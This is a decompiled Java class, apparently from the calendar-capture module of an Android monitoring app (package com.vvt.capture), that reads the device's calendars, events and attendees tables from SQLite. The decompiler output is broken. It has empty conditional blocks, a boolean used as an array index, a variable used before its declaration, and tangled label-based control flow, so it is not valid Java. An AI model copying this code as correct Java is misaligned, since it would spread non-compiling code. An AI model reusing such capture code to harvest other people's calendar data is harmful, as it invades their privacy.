package com.vvt.capture.calendar.e;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;

public class a
  implements b
{
  private static final boolean a = com.vvt.ak.a.a;
  private SQLiteDatabase b;
  
  public Cursor a()
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = this.b;
    String str = "calendars";
    localObject = ((SQLiteDatabase)localObject).query(str, null, null, null, null, null, null);
    boolean bool2 = a;
    if (bool2) {}
    return (Cursor)localObject;
  }
  
  public Cursor a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    String str1 = "deleted = ? AND calendar_id = ? AND eventStatus != 2";
    String[] arrayOfString = new String[2];
    arrayOfString[0] = "0";
    bool1 = true;
    String str2 = Integer.toString(paramInt);
    arrayOfString[bool1] = str2;
    Object localObject = this.b;
    str2 = "events";
    localObject = ((SQLiteDatabase)localObject).query(str2, null, str1, arrayOfString, null, null, null);
    boolean bool2 = a;
    if (bool2) {}
    return (Cursor)localObject;
  }
  
  public Cursor a(int paramInt, String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    String str1 = "(event_id=?) AND (attendeeEmail=?)";
    String[] arrayOfString = new String[2];
    String str2 = String.valueOf(paramInt);
    arrayOfString[0] = str2;
    bool1 = true;
    arrayOfString[bool1] = paramString;
    Object localObject = this.b;
    str2 = "attendees";
    localObject = ((SQLiteDatabase)localObject).query(str2, null, str1, arrayOfString, null, null, null);
    if (localObject != null)
    {
      bool2 = a;
      if (!bool2) {}
    }
    boolean bool2 = a;
    if (bool2) {}
    return (Cursor)localObject;
  }
  
  public Cursor a(String paramString)
  {
    String[] arrayOfString = new String[1];
    arrayOfString[0] = paramString;
    return this.b.query("events", null, "_sync_id = ?", arrayOfString, null, null, null);
  }
  
  public Cursor a(String paramString, String[] paramArrayOfString)
  {
    return this.b.query("events", null, paramString, paramArrayOfString, null, null, null);
  }
  
  public Cursor b(int paramInt)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    String str1 = "(event_id=?) AND (attendeeRelationship=?)";
    String[] arrayOfString = new String[2];
    bool1 = false;
    String str2 = String.valueOf(paramInt);
    arrayOfString[0] = str2;
    Object localObject = String.valueOf(i);
    arrayOfString[i] = localObject;
    localObject = this.b;
    str2 = "attendees";
    i = 0;
    localObject = ((SQLiteDatabase)localObject).query(str2, null, str1, arrayOfString, null, null, null);
    if (localObject != null)
    {
      bool2 = a;
      if (!bool2) {}
    }
    boolean bool2 = a;
    if (bool2) {}
    return (Cursor)localObject;
  }
  
  public boolean b()
  {
    SQLiteDatabase localSQLiteDatabase = com.vvt.capture.calendar.a.a.a();
    if (localSQLiteDatabase != null)
    {
      boolean bool1 = localSQLiteDatabase.isDbLockedByCurrentThread();
      if (!bool1)
      {
        bool1 = localSQLiteDatabase.isDbLockedByOtherThreads();
        if (!bool1) {
          break label40;
        }
      }
    }
    if (localSQLiteDatabase != null) {
      localSQLiteDatabase.close();
    }
    boolean bool2 = false;
    localSQLiteDatabase = null;
    for (;;)
    {
      return bool2;
      label40:
      this.b = localSQLiteDatabase;
      bool2 = true;
    }
  }
  
  public boolean c()
  {
    SQLiteDatabase localSQLiteDatabase = this.b;
    if (localSQLiteDatabase != null)
    {
      localSQLiteDatabase = this.b;
      localSQLiteDatabase.close();
    }
    return true;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calendar/e/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */